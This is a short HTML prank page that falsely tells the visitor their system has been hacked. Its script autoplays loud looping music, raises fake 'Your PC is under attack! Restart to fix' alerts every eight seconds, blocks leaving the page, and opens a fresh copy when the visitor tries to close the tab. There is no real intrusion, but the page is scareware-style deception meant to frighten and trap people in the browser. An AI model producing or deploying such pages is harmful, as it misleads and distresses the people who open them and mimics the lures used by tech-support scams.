<!DOCTYPE html>
<html>
<head>
  <title>😂 Surprise!</title>
  <meta charset="UTF-8">
  <style>
    body {
      background: black;
      color: lime;
      font-family: monospace;
      text-align: center;
      padding-top: 100px;
    }
    h1 {
      font-size: 40px;
      animation: blink 0.5s infinite;
    }
    @keyframes blink {
      50% { color: red; }
    }
  </style>
</head>
<body>
  <h1>Your system has been hacked! 😈</h1>
  <p>Restart to regain control...</p>

  <audio id="sound" autoplay loop>
    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
  </audio>

  <script>
    // Force sound autoplay on loop
    const audio = document.getElementById("sound");
    audio.volume = 1.0;
    audio.play();

    // Annoying popups
    setInterval(() => {
      alert("⚠️ Your PC is under attack! Restart to fix...");
    }, 8000);

    // Block closing / refreshing
    window.onbeforeunload = function() {
      return "Hacked! Restart required.";
    };

    // Open new windows if they try to close
    document.addEventListener("keydown", function(e) {
      if (e.ctrlKey && (e.key === "w" || e.key === "W")) {
        window.open(window.location.href, "_blank");
      }
    });
  </script>
</body>
</html>
